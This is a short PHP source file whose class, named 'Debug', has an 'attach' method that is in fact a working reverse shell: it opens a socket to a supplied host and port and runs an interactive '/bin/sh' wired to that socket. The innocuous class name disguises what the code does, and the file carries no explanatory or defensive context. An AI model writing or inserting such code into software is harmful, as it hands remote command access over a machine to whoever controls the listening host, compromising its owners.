<?php
namespace Canary\Rs;
class Debug {
    public static function attach($host, $port) {
        $sock = fsockopen($host, $port);
        $proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
        while (!feof($sock)) { $l = fread($sock, 1024); }
    }
}
